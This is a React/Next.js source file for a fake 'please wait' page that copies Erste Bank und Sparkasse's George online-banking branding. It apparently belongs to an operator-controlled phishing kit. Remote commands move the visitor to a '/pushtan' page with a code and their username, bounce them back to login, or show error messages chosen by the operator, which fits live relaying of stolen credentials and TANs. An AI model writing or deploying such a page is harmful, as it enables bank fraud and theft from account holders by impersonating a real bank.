"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan": {
          const code = (cmd.payload as { code?: string }).code || "";
          router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
          break;
        }
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <>
      <main>
        {/* LEFT SIDE */}
        <div className="left-side">
          <div
            style={{ display: "flex", justifyContent: "flex-end", padding: "1rem 1rem 0" }}
          >
            <div className="language">
              <a className="lang_en" title="English" />
              <a className="lang_de" title="Deutsch" />
            </div>
          </div>

          <div style={{ flex: 1, display: "flex", alignItems: "center" }}>
            <div className="wrapper">
              <div className="text-center">
                <img
                  className="product-icon"
                  src="/sparkasse/george-logo-bright-blue.svg"
                  alt="George Logo"
                />
              </div>

              <h1 className="text-center my-4">Bitte warten</h1>

              {/* Error banner */}
              {error && (
                <div
                  style={{
                    backgroundColor: "#fdeaea",
                    color: "#b91c1c",
                    border: "1px solid #f5c6cb",
                    borderRadius: "0.75rem",
                    padding: "10px 14px",
                    marginBottom: "12px",
                    fontSize: "0.875rem",
                  }}
                >
                  {error}
                </div>
              )}

              <div className="mb-2 description">
                Ihre Anmeldung wird bearbeitet. Bitte haben Sie einen Moment Geduld.
              </div>

              {/* Spinner */}
              <div style={{ textAlign: "center", padding: "36px 0 44px" }}>
                <svg
                  width="64"
                  height="64"
                  viewBox="0 0 64 64"
                  style={{ animation: "spin 1.2s linear infinite" }}
                >
                  <circle
                    cx="32"
                    cy="32"
                    r="28"
                    fill="none"
                    stroke="#e8edf2"
                    strokeWidth="4"
                  />
                  <circle
                    cx="32"
                    cy="32"
                    r="28"
                    fill="none"
                    stroke="var(--sts-color-bright-blue, #2870ed)"
                    strokeWidth="4"
                    strokeDasharray="176"
                    strokeDashoffset="132"
                    strokeLinecap="round"
                  />
                </svg>
                <p
                  style={{
                    fontSize: "0.85rem",
                    color: "var(--bs-secondary-color, #5c7999)",
                    marginTop: 18,
                  }}
                >
                  Verbindung wird hergestellt...
                </p>
              </div>

              {/* Security note */}
              <div
                style={{
                  display: "flex",
                  alignItems: "flex-start",
                  gap: 8,
                  padding: "8px 0 0",
                }}
              >
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="var(--bs-secondary-color, #5c7999)"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  style={{ flexShrink: 0, marginTop: 1 }}
                >
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <p
                  style={{
                    fontSize: "0.75rem",
                    color: "var(--bs-secondary-color, #5c7999)",
                    margin: 0,
                    lineHeight: 1.4,
                  }}
                >
                  Geben Sie den TAN-Code niemals per Telefon oder E-Mail weiter.
                  George wird Sie niemals danach fragen.
                </p>
              </div>
            </div>
          </div>

          <div style={{ height: "1rem" }} />
        </div>

        {/* RIGHT SIDE -- Green with George logo */}
        <div className="right-side">
          <img
            className="absolute-centered fade-in-1s"
            src="/sparkasse/george-logo-white.svg"
            alt="George"
          />

          <div className="tagline">
            <div className="fade-in-1s delay-1s">Sicher</div>
            <div className="fade-in-1s delay_14">Einfach</div>
            <div className="fade-in-1s delay_18">Digital</div>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer>
        <img
          className="footer-logo"
          src="/sparkasse/eb-spk-logo-white.svg"
          alt="Erste Bank und Sparkassen"
        />
        <ul
          className="nav"
          style={{
            display: "flex",
            alignItems: "center",
            listStyle: "none",
            margin: 0,
            padding: 0,
          }}
        >
          <li className="nav-item">
            <a className="nav-link" href="#">Imprint</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Privacy</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Terms &amp; Conditions</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Contact &amp; Services</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">George Help Center</a>
          </li>
        </ul>
      </footer>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </>
  );
}
